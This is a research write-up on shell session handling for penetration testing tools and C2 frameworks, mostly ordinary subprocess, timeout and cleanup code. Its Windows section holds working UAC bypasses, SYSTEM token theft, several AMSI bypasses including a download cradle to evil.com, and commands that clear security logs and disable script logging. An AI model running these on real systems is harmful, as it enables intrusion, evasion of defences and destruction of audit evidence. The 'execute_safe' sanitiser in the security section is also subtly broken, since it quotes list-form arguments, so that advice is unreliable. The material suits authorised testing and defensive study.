# Research: Shell Session Management for Penetration Testing Tools

- **Query**: Shell session management patterns for both Linux and Windows targets in penetration testing tools
- **Scope**: External research + technical patterns
- **Date**: 2026-05-06

## Overview

This document covers shell session management patterns used in penetration testing frameworks, focusing on cross-platform compatibility, persistent sessions, command execution, state tracking, and cleanup strategies.

---

## 1. Shell Session Lifecycle Management

### Session Initialization

**Linux/Unix Targets:**
- **Interactive shells**: Spawn `/bin/bash`, `/bin/sh`, or `/bin/zsh` with `-i` flag for interactive mode
- **Non-interactive shells**: Use `/bin/sh -c` for single command execution
- **PTY allocation**: Use `pty.spawn()` (Python) or `script -qc` to create pseudo-terminals for full TTY features
- **Shell upgrade**: Common pattern to upgrade basic shells to fully interactive:
  ```bash
  python -c 'import pty; pty.spawn("/bin/bash")'
  # Then background with Ctrl+Z
  stty raw -echo; fg
  export TERM=xterm-256color
  ```

**Windows Targets:**
- **PowerShell**: Preferred for modern Windows exploitation
  - `powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass`
  - `pwsh.exe` for PowerShell Core (cross-platform)
- **CMD**: Legacy command processor
  - `cmd.exe /c` for single commands
  - `cmd.exe /k` to keep shell open after command
- **WinRM**: Remote PowerShell sessions via Windows Remote Management
  ```powershell
  Enter-PSSession -ComputerName target -Credential $cred
  ```

### Session Persistence Patterns

**Linux Multiplexers:**
- **tmux**: Terminal multiplexer for persistent sessions
  ```bash
  tmux new-session -d -s session_name
  tmux send-keys -t session_name "command" C-m
  tmux capture-pane -t session_name -p
  ```
- **screen**: Alternative multiplexer
  ```bash
  screen -dmS session_name
  screen -S session_name -X stuff "command\n"
  screen -S session_name -X hardcopy -h /tmp/output
  ```
- **Background processes**: Using `nohup`, `disown`, or `&`
  ```bash
  nohup command > /tmp/output 2>&1 &
  echo $! > /tmp/pid_file
  ```

**Windows Persistence:**
- **Scheduled tasks**: Create tasks that execute on triggers
  ```powershell
  Register-ScheduledTask -TaskName "UpdateTask" -Trigger $trigger -Action $action
  ```
- **Services**: Install as Windows service for persistence
- **WMI event subscriptions**: Fileless persistence via WMI
- **Registry Run keys**: Classic persistence mechanism

---

## 2. Cross-Platform Shell Handling

### Shell Detection

**Linux/Unix:**
```python
import os
import subprocess

def detect_shell():
    shells = ['/bin/bash', '/bin/sh', '/bin/zsh', '/bin/dash']
    for shell in shells:
        if os.path.exists(shell):
            return shell
    return '/bin/sh'  # fallback
```

**Windows:**
```python
def detect_windows_shell():
    # Check for PowerShell availability
    try:
        result = subprocess.run(['powershell.exe', '-Command', 'echo test'], 
                              capture_output=True, timeout=5)
        if result.returncode == 0:
            return 'powershell'
    except:
        pass
    return 'cmd'  # fallback to CMD
```

### Command Normalization

**Path separators:**
- Linux: `/` (forward slash)
- Windows: `\` (backslash) or `/` (PowerShell accepts both)

**Environment variables:**
- Linux: `$VAR` or `${VAR}`
- Windows CMD: `%VAR%`
- Windows PowerShell: `$env:VAR`

**Command chaining:**
- Linux: `&&` (success), `||` (failure), `;` (always)
- Windows CMD: `&&`, `||`, `&`
- Windows PowerShell: `;` or newlines

---

## 3. Command Execution Patterns

### Timeout and Output Capture

**Python subprocess with timeout:**
```python
import subprocess
import threading

def execute_with_timeout(command, timeout=30, shell_type='bash'):
    try:
        if shell_type == 'bash':
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                executable='/bin/bash'
            )
        elif shell_type == 'powershell':
            process = subprocess.Popen(
                ['powershell.exe', '-Command', command],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
        
        stdout, stderr = process.communicate(timeout=timeout)
        return {
            'stdout': stdout.decode('utf-8', errors='ignore'),
            'stderr': stderr.decode('utf-8', errors='ignore'),
            'returncode': process.returncode,
            'timed_out': False
        }
    except subprocess.TimeoutExpired:
        process.kill()
        stdout, stderr = process.communicate()
        return {
            'stdout': stdout.decode('utf-8', errors='ignore'),
            'stderr': stderr.decode('utf-8', errors='ignore'),
            'returncode': -1,
            'timed_out': True
        }
```

**Async execution pattern:**
```python
import asyncio

async def execute_async(command, timeout=30):
    proc = await asyncio.create_subprocess_shell(
        command,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    
    try:
        stdout, stderr = await asyncio.wait_for(
            proc.communicate(), 
            timeout=timeout
        )
        return stdout.decode(), stderr.decode(), proc.returncode
    except asyncio.TimeoutError:
        proc.kill()
        await proc.wait()
        return '', 'Command timed out', -1
```

### Streaming Output

**Real-time output capture:**
```python
def execute_streaming(command):
    process = subprocess.Popen(
        command,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        bufsize=1,
        universal_newlines=True
    )
    
    for line in iter(process.stdout.readline, ''):
        yield line.rstrip()
    
    process.wait()
```

---

## 4. Shell State Tracking

### Working Directory Tracking

**Linux approach:**
```python
class ShellSession:
    def __init__(self):
        self.cwd = os.getcwd()
    
    def execute(self, command):
        # Prepend cd command to maintain state
        full_command = f"cd {self.cwd} && {command} && pwd"
        result = subprocess.run(full_command, shell=True, capture_output=True)
        
        # Update tracked directory
        output_lines = result.stdout.decode().split('\n')
        if output_lines:
            self.cwd = output_lines[-1].strip()
        
        return result
```

**Windows PowerShell approach:**
```python
class PowerShellSession:
    def __init__(self):
        self.cwd = os.getcwd()
        self.env_vars = {}
    
    def execute(self, command):
        full_command = f"""
        Set-Location '{self.cwd}'
        {command}
        Get-Location | Select-Object -ExpandProperty Path
        """
        # Execute and parse output
```

### Environment Variable Tracking

**Pattern for persistent environment:**
```python
class StatefulShell:
    def __init__(self):
        self.env = os.environ.copy()
        self.cwd = os.getcwd()
    
    def execute(self, command):
        # Check if command modifies environment
        if command.startswith('export ') or command.startswith('set '):
            self._update_env(command)
        
        # Execute with tracked environment
        result = subprocess.run(
            command,
            shell=True,
            env=self.env,
            cwd=self.cwd,
            capture_output=True
        )
        return result
```

### Privilege Level Tracking

**Linux privilege detection:**
```python
def check_privilege():
    uid = os.getuid()
    if uid == 0:
        return 'root'
    
    # Check sudo capability
    try:
        result = subprocess.run(['sudo', '-n', 'true'], 
                              capture_output=True, timeout=1)
        if result.returncode == 0:
            return 'sudo_capable'
    except:
        pass
    
    return 'user'
```

**Windows privilege detection:**
```powershell
# PowerShell command to check admin rights
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

---

## 5. Zombie Process Detection and Cleanup

### Linux Zombie Detection

**Identifying zombies:**
```python
import psutil

def find_zombie_processes():
    zombies = []
    for proc in psutil.process_iter(['pid', 'name', 'status']):
        try:
            if proc.info['status'] == psutil.STATUS_ZOMBIE:
                zombies.append(proc.info)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return zombies
```

**Cleanup pattern:**
```python
import signal
import os

def cleanup_child_processes(parent_pid):
    try:
        parent = psutil.Process(parent_pid)
        children = parent.children(recursive=True)
        
        # Terminate children gracefully
        for child in children:
            try:
                child.terminate()
            except psutil.NoSuchProcess:
                pass
        
        # Wait for termination
        gone, alive = psutil.wait_procs(children, timeout=3)
        
        # Force kill remaining processes
        for proc in alive:
            try:
                proc.kill()
            except psutil.NoSuchProcess:
                pass
    except psutil.NoSuchProcess:
        pass
```

### Process Group Management

**Using process groups to ensure cleanup:**
```python
import subprocess
import os
import signal

def execute_with_cleanup(command):
    # Create new process group
    process = subprocess.Popen(
        command,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        preexec_fn=os.setsid  # Create new session
    )
    
    try:
        stdout, stderr = process.communicate(timeout=30)
    except subprocess.TimeoutExpired:
        # Kill entire process group
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
        process.wait()
    finally:
        # Ensure cleanup
        try:
            os.killpg(os.getpgid(process.pid), signal.SIGKILL)
        except ProcessLookupError:
            pass
```

---

## 6. C2 Framework Patterns

### Empire Framework Approach

**Agent architecture:**
- **Agents**: Persistent implants on target systems
- **Listeners**: Server-side components that handle agent callbacks
- **Modules**: Post-exploitation tasks executed through agents

**Shell session handling:**
- Empire uses a "shell" command that spawns interactive shell sessions
- Commands are queued and executed asynchronously
- Results are retrieved via callback mechanism
- Session state (cwd, env) maintained server-side

**Key patterns:**
```python
# Pseudo-code based on Empire architecture
class Agent:
    def __init__(self, agent_id):
        self.agent_id = agent_id
        self.session_key = generate_key()
        self.working_directory = None
        self.last_seen = time.time()
    
    def execute_command(self, command):
        # Queue command for agent
        task_id = self.queue_task({
            'type': 'shell',
            'command': command,
            'cwd': self.working_directory
        })
        return task_id
    
    def get_results(self, task_id):
        # Retrieve results from callback
        return self.fetch_task_results(task_id)
```

### Covenant Framework Approach

**Grunt architecture (C# implants):**
- **Grunts**: .NET implants that execute tasks
- **Tasks**: C# code compiled and executed in-memory
- **Profiles**: Communication profiles (HTTP, SMB, etc.)

**Shell execution pattern:**
```csharp
// Covenant uses System.Diagnostics.Process for shell execution
public static string ExecuteShellCommand(string command)
{
    ProcessStartInfo psi = new ProcessStartInfo
    {
        FileName = "cmd.exe",
        Arguments = $"/c {command}",
        UseShellExecute = false,
        RedirectStandardOutput = true,
        RedirectStandardError = true,
        CreateNoWindow = true
    };
    
    using (Process process = Process.Start(psi))
    {
        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();
        process.WaitForExit();
        return output + error;
    }
}
```

### PoshC2 Framework Approach

**Implant architecture:**
- **PowerShell-based implants**: Primary implant type
- **C# implants**: Secondary option for better OPSEC
- **Proxy-aware**: Built-in proxy support

**Shell session management:**
```powershell
# PoshC2 maintains persistent PowerShell runspaces
$runspace = [runspacefactory]::CreateRunspace()
$runspace.Open()

# Execute commands in runspace
$pipeline = $runspace.CreatePipeline()
$pipeline.Commands.AddScript($command)
$results = $pipeline.Invoke()
```

**Key features:**
- Maintains PowerShell runspace across commands
- Preserves variables and functions between executions
- Supports background jobs for long-running tasks

---

## 7. Windows-Specific Challenges and Patterns

### UAC Bypass Techniques

**Common bypass methods:**

1. **fodhelper.exe bypass** (Windows 10):
```powershell
# Modify registry to hijack fodhelper execution
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c start cmd.exe"
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Start-Process "C:\Windows\System32\fodhelper.exe"
```

2. **eventvwr.exe bypass**:
```powershell
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd.exe /c start cmd.exe"
Start-Process "C:\Windows\System32\eventvwr.exe"
```

3. **DLL hijacking**: Place malicious DLL in trusted application path

### Token Manipulation

**Impersonation patterns:**
```csharp
// C# code for token impersonation
using System.Runtime.InteropServices;

[DllImport("advapi32.dll", SetLastError = true)]
public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

[DllImport("advapi32.dll", SetLastError = true)]
public static extern bool RevertToSelf();

public static void ImpersonateUser(IntPtr token)
{
    if (!ImpersonateLoggedOnUser(token))
    {
        throw new Exception("Impersonation failed");
    }
}
```

**Token stealing from SYSTEM process:**
```csharp
// Open process with PROCESS_QUERY_INFORMATION
IntPtr hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, systemPid);

// Open process token
IntPtr hToken;
OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken);

// Duplicate token
IntPtr hDupToken;
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, 
                 SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                 TOKEN_TYPE.TokenPrimary, out hDupToken);

// Create process with stolen token
CreateProcessWithTokenW(hDupToken, 0, null, command, 0, IntPtr.Zero, null, 
                       ref si, out pi);
```

### AMSI Bypass Techniques

**AMSI (Anti-Malware Scan Interface) bypass patterns:**

1. **Memory patching**:
```powershell
# Patch AmsiScanBuffer function
$Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Field = $Ref.GetField('amsiInitFailed','NonPublic,Static')
$Field.SetValue($null,$true)
```

2. **Obfuscation**:
```powershell
# Base64 encode commands to evade AMSI
$command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"))
powershell.exe -EncodedCommand $command
```

3. **Reflection-based bypass**:
```powershell
$a = [Ref].Assembly.GetTypes()
ForEach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c = $b
    }
}
$d = $c.GetFields('NonPublic,Static')
ForEach($e in $d) {
    if ($e.Name -like "*Context") {
        $f = $e
    }
}
$f.SetValue($null, [IntPtr]::Zero)
```

### Windows Defender Evasion

**Common evasion techniques:**
- **In-memory execution**: Execute payloads entirely in memory (no disk writes)
- **Process injection**: Inject into legitimate processes
- **Obfuscation**: Encrypt/encode payloads
- **Timing-based evasion**: Sleep before execution to evade sandboxes

**PowerShell execution policy bypass:**
```powershell
# Bypass execution policy
powershell.exe -ExecutionPolicy Bypass -File script.ps1

# Alternative methods
powershell.exe -Command "& {Get-Content script.ps1 | Invoke-Expression}"
Get-Content script.ps1 | powershell.exe -NoProfile -
```

### Windows Event Log Evasion

**Clearing specific event logs:**
```powershell
# Clear Security log (requires admin)
wevtutil cl Security

# Clear PowerShell logs
wevtutil cl Microsoft-Windows-PowerShell/Operational
```

**Disabling logging:**
```powershell
# Disable PowerShell script block logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
```

---

## 8. Resource Management Best Practices

### Connection Pooling

**Managing multiple shell sessions:**
```python
class ShellSessionPool:
    def __init__(self, max_sessions=10):
        self.sessions = {}
        self.max_sessions = max_sessions
        self.lock = threading.Lock()
    
    def get_session(self, target_id):
        with self.lock:
            if target_id not in self.sessions:
                if len(self.sessions) >= self.max_sessions:
                    # Evict oldest session
                    oldest = min(self.sessions.items(), 
                               key=lambda x: x[1].last_used)
                    self.close_session(oldest[0])
                
                self.sessions[target_id] = ShellSession(target_id)
            
            self.sessions[target_id].last_used = time.time()
            return self.sessions[target_id]
    
    def close_session(self, target_id):
        if target_id in self.sessions:
            self.sessions[target_id].cleanup()
            del self.sessions[target_id]
```

### Timeout Management

**Hierarchical timeout strategy:**
```python
class TimeoutManager:
    def __init__(self):
        self.command_timeout = 30      # Individual command timeout
        self.session_timeout = 300     # Session idle timeout
        self.global_timeout = 3600     # Maximum session lifetime
    
    def execute_with_timeout(self, command, timeout=None):
        timeout = timeout or self.command_timeout
        
        start_time = time.time()
        result = self._execute(command, timeout)
        elapsed = time.time() - start_time
        
        # Log slow commands
        if elapsed > timeout * 0.8:
            self.log_slow_command(command, elapsed)
        
        return result
```

### Memory Management

**Limiting output buffer size:**
```python
class BoundedOutputCapture:
    def __init__(self, max_size=1024*1024):  # 1MB default
        self.max_size = max_size
        self.buffer = []
        self.current_size = 0
        self.truncated = False
    
    def append(self, data):
        data_size = len(data)
        
        if self.current_size + data_size > self.max_size:
            # Truncate to fit
            remaining = self.max_size - self.current_size
            self.buffer.append(data[:remaining])
            self.truncated = True
            return False
        
        self.buffer.append(data)
        self.current_size += data_size
        return True
    
    def get_output(self):
        output = ''.join(self.buffer)
        if self.truncated:
            output += "\n[OUTPUT TRUNCATED]"
        return output
```

---

## 9. Error Handling and Recovery

### Graceful Degradation

**Fallback shell selection:**
```python
def get_shell_with_fallback(target_os):
    if target_os == 'linux':
        shells = [
            '/bin/bash',
            '/bin/sh',
            '/bin/dash',
            '/bin/ash'
        ]
        for shell in shells:
            if check_shell_available(shell):
                return shell
    elif target_os == 'windows':
        shells = ['powershell', 'pwsh', 'cmd']
        for shell in shells:
            if check_shell_available(shell):
                return shell
    
    raise Exception("No suitable shell found")
```

### Session Recovery

**Reconnection logic:**
```python
class ResilientShellSession:
    def __init__(self, target):
        self.target = target
        self.max_retries = 3
        self.retry_delay = 5
    
    def execute(self, command):
        for attempt in range(self.max_retries):
            try:
                return self._execute_internal(command)
            except ConnectionError:
                if attempt < self.max_retries - 1:
                    time.sleep(self.retry_delay)
                    self._reconnect()
                else:
                    raise
    
    def _reconnect(self):
        # Attempt to re-establish connection
        self.session = self._create_new_session()
```

---

## 10. Security Considerations

### Command Injection Prevention

**Input sanitization:**
```python
import shlex

def sanitize_command(user_input):
    # Use shlex.quote to escape shell metacharacters
    return shlex.quote(user_input)

def execute_safe(command, args):
    # Use list form to avoid shell injection
    cmd_list = [command] + [shlex.quote(arg) for arg in args]
    return subprocess.run(cmd_list, capture_output=True)
```

### Credential Management

**Secure credential handling:**
```python
import keyring
from cryptography.fernet import Fernet

class CredentialManager:
    def __init__(self):
        self.cipher = Fernet(self._get_or_create_key())
    
    def store_credential(self, target_id, username, password):
        encrypted = self.cipher.encrypt(password.encode())
        keyring.set_password(f"pentest_{target_id}", username, 
                           encrypted.decode())
    
    def get_credential(self, target_id, username):
        encrypted = keyring.get_password(f"pentest_{target_id}", username)
        if encrypted:
            return self.cipher.decrypt(encrypted.encode()).decode()
        return None
```

### Audit Logging

**Comprehensive logging pattern:**
```python
import logging
import json
from datetime import datetime

class AuditLogger:
    def __init__(self, log_file):
        self.logger = logging.getLogger('pentest_audit')
        handler = logging.FileHandler(log_file)
        handler.setFormatter(logging.Formatter('%(message)s'))
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.INFO)
    
    def log_command(self, session_id, command, result):
        entry = {
            'timestamp': datetime.utcnow().isoformat(),
            'session_id': session_id,
            'command': command,
            'returncode': result.returncode,
            'output_length': len(result.stdout),
            'duration': result.duration
        }
        self.logger.info(json.dumps(entry))
```

---

## Summary

Shell session management in penetration testing tools requires careful consideration of:

1. **Cross-platform compatibility**: Handle both Linux/Unix and Windows targets with appropriate shell selection and command normalization
2. **Persistent sessions**: Use multiplexers (tmux/screen) on Linux and scheduled tasks/services on Windows
3. **Robust execution**: Implement timeouts, output capture, and streaming for reliable command execution
4. **State tracking**: Maintain working directory, environment variables, and privilege level across commands
5. **Resource cleanup**: Detect and eliminate zombie processes, manage connection pools, and implement proper timeout hierarchies
6. **Windows-specific challenges**: Handle UAC bypass, token manipulation, AMSI evasion, and Windows Defender
7. **Error recovery**: Implement fallback mechanisms and reconnection logic for resilient operations
8. **Security**: Sanitize inputs, manage credentials securely, and maintain comprehensive audit logs

Modern C2 frameworks like Empire, Covenant, and PoshC2 demonstrate these patterns through agent-based architectures that maintain persistent sessions, queue commands asynchronously, and handle cross-platform execution with appropriate abstractions.
